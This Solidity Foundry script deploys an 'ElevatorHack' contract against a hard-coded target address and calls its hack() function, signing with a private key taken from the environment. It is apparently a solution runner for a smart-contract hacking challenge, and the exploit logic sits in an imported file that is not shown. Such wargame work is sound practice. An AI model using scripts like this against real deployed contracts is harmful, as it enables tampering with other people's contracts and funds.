// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import "forge-std/Script.sol";
import "../src/ElevatorHack.sol";

contract ElevatorHackScript is Script {
    uint256 deployerPrivateKey;
    address _targetAddress = 0xA3B95BE293E56cbF7e24dE525AB08D2de511D461;

    function setUp() public {
        deployerPrivateKey = vm.envUint("PRIVATE_KEY");
    }

    function run() public {
        vm.startBroadcast(deployerPrivateKey);

        ElevatorHack elevatorHack = new ElevatorHack(_targetAddress);
        elevatorHack.hack();
        
        vm.stopBroadcast();
    }
}
